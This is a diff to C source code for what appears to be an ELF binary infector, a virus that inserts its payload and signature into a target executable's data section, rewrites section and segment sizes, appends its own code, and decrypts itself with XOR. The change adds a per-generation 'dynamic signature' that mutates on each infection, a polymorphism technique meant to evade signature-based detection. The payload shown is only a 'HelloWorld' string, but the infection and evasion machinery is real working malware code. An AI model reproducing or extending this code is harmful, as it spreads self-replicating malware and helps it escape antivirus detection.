@@ -26,6 +26,8 @@ enum __ptrace_request {
 #define BUF_SIZE 1024 * 1024 * 5
 #define PAYLOAD "HelloWorld"
 
+static void updateSignature(void);
+static void dynamicSignature(void);
 static void end(void);
 static void lambdaEnd(void);
 static void lambdaStart(void);
@@ -95,6 +97,13 @@ static void *align(size_t value) {
   return (void *)(((value + (4096 - 1)) & -4096) - 4096);
 }
 
+static void updateSignature(void) {
+  size_t  *signature;
+
+  signature = (void *)dynamicSignature + 4;
+  *signature -= 1;
+}
+
 static int unObfuscate(void) {
   size_t  i;
   size_t  size;
@@ -111,6 +120,7 @@ static int unObfuscate(void) {
     code[i] ^= 0xa5;
     i += 1;
   }
+  updateSignature();
   if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_EXEC | PROT_READ) < 0)
     return (-1);
   return (0);
@@ -456,6 +466,17 @@ struct bfile {
   Elf64_Ehdr  *header;
 };
 
+static void       dynamicSignature(void) {
+  asm("nop\n\t"
+      "nop\n\t"
+      "nop\n\t"
+      "nop\n\t"
+      "nop\n\t"
+      "nop\n\t"
+      "nop\n\t"
+      "nop");
+}
+
 #include <string.h>
 
 static int  mapFile(const char *dirname, const char *filename, struct bfile *bin) {
@@ -484,7 +505,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     munmap(tmp, len);
     return (-1);
   }
-  if ((bin->header = mmap(0, stats.st_size + strlen(payload), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
+  if ((bin->header = mmap(0, stats.st_size + strlen(payload) + sizeof(size_t), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
     close(fd);
     munmap(tmp, len);
     return (-1);
@@ -540,9 +561,11 @@ static void  appendSignature(struct bfile file, size_t offset) {
   size_t  toAdd;
 
   char payload[] = PAYLOAD;
-  toAdd = strlen(payload) + 1;
+  toAdd = strlen(payload) + 1 + sizeof(size_t);
   memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
-  memcpy(((void *)file.header) + offset, payload, toAdd);
+  memcpy(((void *)file.header) + offset, payload, toAdd - sizeof(size_t) - 1);
+  memcpy(((void *)file.header) + offset + strlen(payload), (void *)dynamicSignature + 4, sizeof(size_t));
+  memset(((void *)file.header) + offset + toAdd - 1, 0, 1);
 }
 
 static void obfuscate(char *header, size_t size) {
@@ -616,24 +639,24 @@ static int  infectFile(struct bfile bin) {
   Elf64_Off   offset;
 
   char payload[] = PAYLOAD;
-  len = strlen(payload);
+  len = strlen(payload) + sizeof(size_t) + 1;
   data = getDataSectionHeader(bin.header);
   offset = data->sh_offset;
   size = data->sh_size;
   appendSignature(bin, offset + size);
-  updateOffsets(bin.header, offset + size, len + 1);
+  updateOffsets(bin.header, offset + size, len);
   data = getDataSectionHeader(bin.header);
   seg = ((void *)bin.header) + bin.header->e_phoff;
   while (seg != ((void *)bin.header) + bin.header->e_phoff + bin.header->e_phnum * sizeof(Elf64_Phdr)) {
     if (seg->p_offset <= data->sh_offset &&
       seg->p_offset + seg->p_filesz >= data->sh_offset + data->sh_size) {
-      seg->p_filesz += strlen(payload) + 1;
-      seg->p_memsz += strlen(payload) + 1;
+      seg->p_filesz += len;
+      seg->p_memsz += len;
     }
     seg += 1;
   }
-  data->sh_size += strlen(payload) + 1;
-  bin.size += len + 1;
+  data->sh_size += len;
+  bin.size += len;
   if (appendCode(&bin) == -1)
     return (-1);
   write(bin.fd, bin.header, bin.size);
